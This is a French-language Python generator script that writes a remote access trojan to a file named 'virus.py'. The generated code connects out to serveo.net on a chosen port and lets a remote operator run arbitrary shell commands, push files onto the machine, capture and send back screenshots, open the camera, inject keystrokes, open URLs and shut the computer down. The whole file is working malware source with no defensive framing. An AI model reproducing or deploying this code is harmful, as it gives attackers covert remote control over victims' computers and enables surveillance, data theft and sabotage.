# === generateur.py ===
def generer_code(port):
    contenu = modele_code.replace("{PORT}", str(port))
    with open("virus.py", "w", encoding="utf-8") as f:
        f.write(contenu)
    print(f"[✓] Le fichier 'virus.py' a été généré avec le port {port}.")

modele_code = '''
import socket
import subprocess
import os
import tkinter as tk
from threading import Thread
import platform
import tempfile
import time

if os.name == 'nt':
    upload_dir = 'C:/uploads'
else:
    upload_dir = '/uploads'

if not os.path.exists(upload_dir):
    os.makedirs(upload_dir)

def show_message(msg):
    root = tk.Tk()
    root.title("Message")
    root.geometry("300x100")
    label = tk.Label(root, text=msg, padx=10, pady=10)
    label.pack()
    root.after(5000, root.destroy)
    root.mainloop()

def connect_to_server():
    host = 'serveo.net'  # <-- À remplacer si besoin
    port = {PORT}
    s = socket.socket()
    s.connect((host, port))

    hostname = platform.node()
    s.send(hostname.encode(errors='ignore'))

    while True:
        data = s.recv(1024).decode(errors='ignore')

        if data == "exit":
            break

        elif data.startswith("shell:"):
            cmd = data[6:]
            output = subprocess.getoutput(cmd)
            s.send(output.encode(errors='ignore') + b"\\n")

        elif data.startswith("web:"):
            url = data[4:]
            if os.name == 'nt':
                os.system(f'start {url}')
            else:
                os.system(f'xdg-open {url}')
            s.send("[+] Site ouvert\\n")

        elif data.startswith("msg:"):
            msg = data[4:]
            Thread(target=show_message, args=(msg,)).start()
            s.send("[+] Message affiché\\n")

        elif data.startswith("upload:"):
            filename = data[7:]
            full_path = os.path.join(upload_dir, os.path.basename(filename))
            with open(full_path, "wb") as f:
                s.send(b"READY")
                while True:
                    chunk = s.recv(1024)
                    if chunk.endswith(b"<END>"):
                        f.write(chunk[:-5])
                        break
                    f.write(chunk)
            s.send(f"[+] Fichier reçu: {full_path}\\n".encode())

        elif data.startswith("screenshot"):
            if os.name == 'nt':
                temp_file = os.path.join(tempfile.gettempdir(), "screen.png")
                powershell_cmd = f"powershell -command \\"Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); $bitmap.Save('{temp_file}'); $graphics.Dispose(); $bitmap.Dispose();\\""
                subprocess.call(powershell_cmd, shell=True)
                if os.path.exists(temp_file):
                    with open(temp_file, "rb") as f:
                        while True:
                            chunk = f.read(1024)
                            if not chunk:
                                break
                            s.send(chunk)
                    s.send(b"<END>")
            else:
                s.send("[!] Screenshot non supporté\\n")

        elif data.startswith("camera"):
            if os.name == 'nt':
                os.system("start microsoft.windows.camera:")
                s.send("[+] Camera ouverte\\n")
            else:
                s.send("[!] Camera non supportée\\n")

        elif data.startswith("shutdown"):
            if os.name == 'nt':
                subprocess.call("shutdown /s /t 0", shell=True)
            else:
                subprocess.call("shutdown now", shell=True)
            s.send("[+] Shutdown initié\\n")

        elif data.strip() == "beep":
            try:
                if os.name == 'nt':
                    os.system("echo \\a")
                else:
                    print('\\a')
                s.send("[+] Bip exécuté\\n")
            except:
                s.send("[-] Erreur lors du bip\\n")

        elif data.startswith("key:"):
            key = data[4:].strip()
            if os.name == 'nt':
                powershell_key = f"powershell -command \\"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{key}')\\""
                subprocess.call(powershell_key, shell=True)
                s.send("[+] Touche envoyée\\n")
            else:
                s.send("[!] KEY non supporté\\n")

        elif data.startswith("type:"):
            text = data[5:].strip()
            if os.name == 'nt':
                for char in text:
                    subprocess.call(f"powershell -command \\"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{char}')\\"", shell=True)
                    time.sleep(0.05)
                s.send("[+] Texte envoyé\\n")
            else:
                s.send("[!] TYPE non supporté\\n")

        else:
            s.send("Commande inconnue\\n")

    s.close()

connect_to_server()
'''

# Demande à l'utilisateur
try:
    port = int(input("🔌 Entrez le port à utiliser : "))
    generer_code(port)
except ValueError:
    print("⛔ Le port doit être un nombre entier.")
